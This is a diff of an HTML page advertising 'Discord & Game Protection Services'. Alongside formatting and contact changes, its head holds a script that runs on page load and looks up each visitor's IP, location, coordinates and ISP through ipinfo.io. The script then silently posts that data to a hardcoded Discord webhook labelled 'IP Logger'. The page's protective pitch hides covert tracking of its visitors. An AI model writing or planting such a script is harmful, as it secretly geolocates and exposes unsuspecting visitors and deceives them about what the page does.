@@ -1,97 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord & Game Protection Services</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            padding: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: auto;
-            background: #fff;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        h1, h2 {
-            color: #444;
-        }
-        .features {
-            list-style-type: none;
-            padding: 0;
-        }
-        .features li {
-            padding: 10px 0;
-            border-bottom: 1px solid #ddd;
-        }
-        .features li:last-child {
-            border-bottom: none;
-        }
-        .contact {
-            margin-top: 20px;
-        }
-    </style>
-    <script>
-        fetch('https://ipinfo.io/json')
-            .then(response => response.json())
-            .then(data => {
-                fetch(`https://ipinfo.io/${data.ip}/json`)
-                    .then(response => response.json())
-                    .then(info => {
-                        const city = info.city || 'N/A';
-                        const region = info.region || 'N/A';
-                        const country = info.country || 'N/A';
-                        const timezone = info.timezone || 'N/A';
-                        const loc = info.loc ? info.loc.split(',') : ['N/A', 'N/A'];
-                        const latitude = loc[0];
-                        const longitude = loc[1];
-                        const postal = info.postal || 'N/A';
-                        const isp = info.org || 'N/A';
-                        const as_number = info.asn || 'N/A';
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord & Game Protection Services</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+      padding: 20px;
+    }
 
-                        const webhookUrl = 'https://discord.com/api/webhooks/1272043123459100692/41d7UAjdVU6sgcQ9avYwOBmpXast31HpbyT24N4Eg5dv3gjoFqg7slFcm7LHl4f0v3G-';
-                        const payload = {
-                            content: `New IP logged:\nIP: ${info.ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nTimezone: ${timezone}\nLatitude: ${latitude}\nLongitude: ${longitude}\nPostal: ${postal}\nISP: ${isp}\nASN: ${as_number}`,
-                            username: 'IP Logger'
-                        };
-                        fetch(webhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(payload)
-                        });
-                    });
+    .container {
+      max-width: 800px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    h1,
+    h2 {
+      color: #444;
+    }
+
+    .features {
+      list-style-type: none;
+      padding: 0;
+    }
+
+    .features li {
+      padding: 10px 0;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .features li:last-child {
+      border-bottom: none;
+    }
+
+    .contact {
+      margin-top: 20px;
+    }
+  </style>
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        fetch(`https://ipinfo.io/${data.ip}/json`)
+          .then(response => response.json())
+          .then(info => {
+            const city = info.city || 'N/A';
+            const region = info.region || 'N/A';
+            const country = info.country || 'N/A';
+            const timezone = info.timezone || 'N/A';
+            const loc = info.loc ? info.loc.split(',') : ['N/A', 'N/A'];
+            const latitude = loc[0];
+            const longitude = loc[1];
+            const postal = info.postal || 'N/A';
+            const isp = info.org || 'N/A';
+            const as_number = info.asn || 'N/A';
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1272043123459100692/41d7UAjdVU6sgcQ9avYwOBmpXast31HpbyT24N4Eg5dv3gjoFqg7slFcm7LHl4f0v3G-';
+            const payload = {
+              content: `New IP logged:\nIP: ${info.ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nTimezone: ${timezone}\nLatitude: ${latitude}\nLongitude: ${longitude}\nPostal: ${postal}\nISP: ${isp}\nASN: ${as_number}`,
+              username: 'IP Logger'
+            };
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(payload)
             });
-    </script>
+          });
+      });
+  </script>
 </head>
+
 <body>
-    <div class="container">
-        <h1>Discord & Game Protection Services</h1>
-        <p>We offer top-notch protection for your Discord servers and gaming communities. Keep your members safe with our advanced protection tools.</p>
+  <div class="container">
+    <h1>Discord & Game Protection Services</h1>
+    <p>We offer top-notch protection for your Discord servers and gaming communities. Keep your members safe with our
+      advanced protection tools.</p>
 
-        <h2>Features</h2>
-        <ul class="features">
-            <li>Anti-Spam & Anti-Raid Protection</li>
-            <li>Advanced Moderation Tools</li>
-            <li>Game Server DDoS Protection</li>
-            <li>Custom Security Solutions</li>
-            <li>24/7 Support</li>
-        </ul>
+    <h2>Features</h2>
+    <ul class="features">
+      <li>Anti-Spam & Anti-Raid Protection</li>
+      <li>Advanced Moderation Tools</li>
+      <li>Game Server DDoS Protection</li>
+      <li>Custom Security Solutions</li>
+      <li>24/7 Support</li>
+    </ul>
 
-        <h2>Pricing</h2>
-        <p>Our services are available at affordable prices. Contact us for a custom quote based on your needs.</p>
+    <h2>Pricing</h2>
+    <p>Our services are available at affordable prices. Contact us for a custom quote based on your needs.</p>
 
-        <div class="contact">
-            <h2>Contact Us</h2>
-            <p>Email: support@example.com</p>
-            <p>Phone: (123) 456-7890</p>
-        </div>
+    <div class="contact">
+      <h2>Contact Us</h2>
+      <p>Email: support@jungletagvr.com</p>
     </div>
+  </div>
 </body>
+
 </html>
